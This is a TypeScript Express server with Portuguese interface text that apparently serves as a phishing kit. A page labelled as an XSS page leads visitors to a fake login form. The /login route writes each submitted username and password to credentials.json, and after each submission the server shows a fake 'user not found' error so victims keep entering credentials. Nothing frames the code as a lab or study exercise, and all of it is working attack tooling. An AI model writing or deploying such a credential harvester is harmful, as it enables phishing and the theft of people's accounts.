import express, { Request, Response } from 'express';
import path from 'path';
import fs from 'fs';
import { exec } from 'child_process';

const app = express();
const PORT: number = 3000;

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files (CSS, images, etc.)
app.use(express.static('public'));
app.use('/assets', express.static('src/assets'));

const tentativas: number = 5;

const openBrowser = (url: string): void => {
    const start = process.platform === 'darwin' ? 'open' :
        process.platform === 'win32' ? 'start' : 'xdg-open';
    exec(`${start} ${url}`);
};

interface LoginData {
    usuario: string;
    senha: string;
    timestamp?: string;
}

const saveCredentialsToJson = (usuario: string, senha: string): void => {
    const loginData: LoginData = {
        usuario: usuario,
        senha: senha,
        timestamp: new Date().toISOString()
    };

    const credentialsPath = path.join(__dirname, '../credentials.json');

    try {

        let existingData: LoginData[] = [];
        if (fs.existsSync(credentialsPath)) {
            const fileContent = fs.readFileSync(credentialsPath, 'utf8').trim();
            if (fileContent.length > 0) {
                try {
                    existingData = JSON.parse(fileContent);
                } catch (parseError) {
                    console.log('Invalid JSON in credentials.json, starting fresh');
                    existingData = [];
                }
            }
        }

        // Add new login data
        existingData.push(loginData);

        // Write back to file
        fs.writeFileSync(credentialsPath, JSON.stringify(existingData, null, 2));
        console.log('Credentials saved to credentials.json');
    } catch (error) {
        console.error('Error saving credentials:', error);
    }
};

// Route for the XSS page (initial page)
app.get('/', (req: Request, res: Response): void => {
    try {
        const htmlTemplate = fs.readFileSync(path.join(__dirname, 'xss_page.html'), 'utf8');
        let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
        htmlWithData = htmlWithData.replace('{{error_message}}', '');

        res.send(htmlWithData);
    } catch (error) {
        console.error('Error reading XSS HTML template:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Route for the fake page (redirected from XSS page)
app.get('/fake_page.html', (req: Request, res: Response): void => {
    try {
        const htmlTemplate = fs.readFileSync(path.join(__dirname, 'fake_page.html'), 'utf8');
        let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());

        // Show error message if there's an error parameter
        const showError = req.query.error === 'invalid';
        if (showError) {
            htmlWithData = htmlWithData.replace('{{error_message}}', '<div style="color: red; font-size: 14px; margin-top: 10px;">• Usuário não encontrado</div>');
        } else {
            htmlWithData = htmlWithData.replace('{{error_message}}', '');
        }

        res.send(htmlWithData);
    } catch (error) {
        console.error('Error reading fake page HTML template:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Handle login form submission
app.post('/login', (req: Request, res: Response): void => {
    const { usuario, senha } = req.body;

    // Save credentials to JSON file
    saveCredentialsToJson(usuario, senha);

    // Log the attempt and redirect back with error
    console.log(`Login attempt saved: ${usuario}`);
    res.redirect('/fake_page.html?error=invalid');
});

// Handle help link
app.get('/help', (req: Request, res: Response): void => {
    res.send('<h1>Ajuda - Soluções para problemas no Acesso</h1><p>Entre em contato com o suporte técnico.</p>');
});

app.listen(PORT, (): void => {
    const url = `http://localhost:${PORT}`;
    console.log(`Servidor rodando em ${url}`);
    console.log('Iniciando com XSS page, que redirecionará para fake page e depois para link externo...');

    // Automatically open browser
    console.log('Abrindo navegador...');
    openBrowser(url);
});